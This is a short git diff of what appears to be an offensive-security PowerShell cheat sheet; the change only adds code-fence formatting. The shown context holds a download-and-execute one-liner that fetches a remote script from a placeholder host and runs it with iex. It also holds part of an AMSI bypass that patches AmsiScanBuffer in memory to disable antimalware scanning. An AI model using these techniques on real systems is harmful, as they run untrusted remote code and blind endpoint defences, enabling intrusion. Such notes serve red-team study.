@@ -36,7 +36,8 @@ powershell.exe
 `iex (New-Object Net.WebClient).DownloadString('http://ip/script.ps1'); "function name with args"`
 
 ## Bypassing AMSI
-`$code = @"
+```powershell
+$code = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -62,7 +63,8 @@ $o = 0
 [Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, 0x40, [ref] $o)
 
 [System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddress, $ret.Length)
-[Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, $o, [ref] $null)`
+[Native]::VirtualProtect($asbAddress, [uint32]$ret.Length, $o, [ref] $null)
+```
 
 ## Locate files in the whole drive
 `dir filename.extension /s` (do it from C:\ folder)(supports regex)
